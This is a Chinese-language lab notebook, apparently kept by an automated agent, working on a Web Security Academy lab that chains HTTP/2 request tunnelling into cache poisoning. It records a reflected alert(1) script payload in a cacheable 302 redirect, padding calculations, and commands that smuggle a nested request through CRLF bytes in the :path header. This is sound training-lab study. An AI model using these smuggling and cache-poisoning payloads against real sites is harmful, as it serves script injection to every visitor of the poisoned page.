---
title: lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling
---

# lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling

> evidences: [[h2-smuggling-family]]

- 题面:毒 `/` 的缓存,使每 15s 访问首页的受害者浏览器执行 `alert(1)`;前端 h2→h1 降级、"doesn't consistently sanitize incoming headers"、不复用后端连接(只剩 tunnelling)。
- 实例(批47):https://0af5004203400b3480af12a600110039.web-security-academy.net
- 判定:**stuck**(载荷出处与缓存面全部复证;缺"把嵌套字节垫到外层期望长度"的装配)

## 新证据

1. **载荷出处复证 + 关键细节:回显逐字跟随输入**。用 `:path` 发**百分号编码**的载荷 ⇒ `Location` 也返回**编码形**:
   `GET /resources/labheader/js?%3Cscript%3Ealert(1)%3C/script%3E` → `302` + `location: /resources/labheader/js/?%3Cscript%3Ealert(1)%3C/script%3E` + `cache-control: max-age=30` + `age: 0` + `x-cache: miss` + `content-length: 0`。
   ⇒ 批44 读到的"原样不编码"是因为当时发的是**原样字节**;要拿到可执行的裸 `<script>` 必须发裸字节,别发 `%3C`。
2. 该 302 自身可缓存(max-age=30、X-Cache miss→hit),可作为"记在某个键上的可缓存响应"。
3. 载体约束复核:受害者只访问 `/`,故毒必须记在 `/` 上 ⇒ 外层必须是 `HEAD /`(前端期望长度 = `/` 体长,本实例约 8.6~8.9KB),由后端过读把嵌套响应字节当成 `/` 的体;而嵌套重定向响应带 `Keep-Alive: timeout=0`(后端随即关连接)⇒ **垫片请求不可行**,嵌套响应自身必须 ≥ 外层期望长度 ⇒ 查询串要垫到 ~8.4KB。
4. 新件能力(本批可用的杠杆):`h2_req --hdr2-file <FILE>` / `--data-file <FILE>` / `--pad-to N` ⇒ 大注入体可以**由文件提供**,不必手写进 argv(批44 卡在"没有件能塞 8.4K")。方向:生成一个 8.4KB 的 `:path` 垫片文件,外层 `HEAD /`。

## 未决面

- 装配未跑通:`:path` 需要 `--hdr2-file` 的字节形态(逐字含 CRLF 的伪头)还是 `--path @file` 仍未定;另需现测本实例 `/` 的精确体长(前端期望长度)才能算出垫片字节数。
- 下一个可证伪的判据沿用 lab 2 的记账面:外层 `HEAD /` + 注入,若前端报 `500 Received only N of expected M bytes of data` 就能直接读出"嵌套响应是否够长",不需要猜。

## 复现命令

```
range_launch launch 97E46BF5…DEFCE4F1 --jar ~/.pi-rs/agent/chrome-jar.json
h2_req "https://<inst>/" --method GET --path '/resources/labheader/js?<script>alert(1)</script>'   # 裸字节才有裸回显
h2_req "https://<inst>/" --method HEAD --path '/ HTTP/1.1\r\nHost: <inst>\r\n\r\nGET /resources/labheader/js?<script>alert(1)</script><PAD> HTTP/1.1\r\nHost: <inst>\r\n' --read-ms 3000
```

## 关系

- 族:[[h2-smuggling-family]]、[[cache-poisoning-family]];方法见 [[h2-tunnelling-and-h2cl-practice]]、[[cache-and-smuggling-live-mechanisms]]。
